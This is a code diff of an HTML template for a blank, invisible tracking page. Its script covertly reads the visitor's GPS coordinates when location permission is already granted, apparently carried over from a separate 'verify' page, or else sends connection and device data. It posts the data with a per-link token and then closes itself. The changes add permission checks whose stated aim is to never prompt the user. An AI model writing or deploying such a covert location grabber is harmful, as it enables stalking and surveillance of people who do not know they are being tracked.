@@ -2,24 +2,20 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-<meta http-equiv="refresh" content="0;url=about:blank" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title> </title>
 <style>
-  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body {
-    background: #000;
-    overflow: hidden;
-    width: 100%; height: 100%;
-  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
   body { opacity: 0; }
 </style>
 </head>
 <body>
 <script>
 (function() {
+  'use strict';
   var token = "{{ token }}";
-  var sent = false;
+  var _sent = false;
 
   {% if expired %}
     try { window.location.replace('about:blank'); } catch(e) {}
@@ -39,9 +35,8 @@
   }
 
   function sendCoords(lat, lng, acc) {
-    if (sent) return;
-    sent = true;
-    window._sent = true;
+    if (_sent) return;
+    _sent = true;
     var payload = JSON.stringify({
       token: token,
       latitude: lat,
@@ -58,41 +53,9 @@
     }
   }
 
-  // ── Aggressively try GPS (permission should be cached from verify page) ──
-  function tryGPS() {
-    if (!("geolocation" in navigator)) return;
-
-    // Try with maximumAge to use any cached position immediately
-    navigator.geolocation.getCurrentPosition(
-      function(pos) {
-        sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-      },
-      function(err) {
-        // GPS failed — maybe permission was revoked. Still vanish.
-      },
-      { enableHighAccuracy: true, timeout: 5000, maximumAge: 300000 }
-    );
-
-    // Retry with fresh position after a brief delay (for better accuracy)
-    // This gets the device to use GPS chips instead of cached WiFi position
-    setTimeout(function() {
-      if (!window._sent && "geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          function(pos) {
-            sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-          },
-          function() {},
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      }
-    }, 500);
-  }
-
-  // ── Send IP data as fallback ──
-  function sendIPFallback() {
-    if (sent) return;
-    sent = true;
-    window._sent = true;
+  function sendFallback() {
+    if (_sent) return;
+    _sent = true;
     var payload = JSON.stringify({
       token: token,
       connectionType: getConnType(),
@@ -106,7 +69,6 @@
     }
   }
 
-  // ── Vanish (best effort close) ──
   function vanish() {
     try { window.location.replace('about:blank'); } catch(e) {}
     try { window.open('', '_self', '').close(); } catch(e) {}
@@ -121,20 +83,66 @@
     }, 5);
   }
 
-  // ── Execute ──
-  tryGPS();
+  // ── Permission-aware GPS attempt ──
+  // Query permission FIRST — never triggers a prompt
+  // granted: GPS fires silently
+  // denied/prompt: silently fall back to IP, never prompt the user
+  if (navigator.permissions && navigator.permissions.query) {
+    navigator.permissions.query({ name: 'geolocation' }).then(function(status) {
+      if (status.state === 'granted' && 'geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+            vanish();
+          },
+          function() {
+            sendFallback();
+            vanish();
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
+        );
+        setTimeout(function() {
+          if (!_sent) { sendFallback(); vanish(); }
+        }, 10000);
+      } else {
+        // denied or prompt — never trigger the browser prompt
+        sendFallback();
+        vanish();
+      }
+    }).catch(function() {
+      // Permissions API unavailable — try GPS anyway (may prompt on some browsers)
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) { sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); vanish(); },
+          function() { sendFallback(); vanish(); },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
+        );
+        setTimeout(function() { if (!_sent) { sendFallback(); vanish(); } }, 10000);
+      } else {
+        sendFallback();
+        vanish();
+      }
+    });
+  } else {
+    // No Permissions API — try GPS (Chrome without gesture → silent error, Safari → may prompt)
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        function(pos) { sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); vanish(); },
+        function() { sendFallback(); vanish(); },
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
+      );
+      setTimeout(function() { if (!_sent) { sendFallback(); vanish(); } }, 10000);
+    } else {
+      sendFallback();
+      vanish();
+    }
+  }
 
-  // Wait for GPS attempt, then send IP fallback and vanish
+  // Hard timeout — vanish after 4s regardless
   setTimeout(function() {
-    if (!window._sent) sendIPFallback();
+    if (!_sent) { sendFallback(); }
     vanish();
-  }, 3000);
-
-  // Force vanish after 6s regardless
-  setTimeout(function() {
-    if (!window._sent) { window._sent = true; }
-    vanish();
-  }, 6000);
+  }, 4000);
 })();
 </script>
 </body>
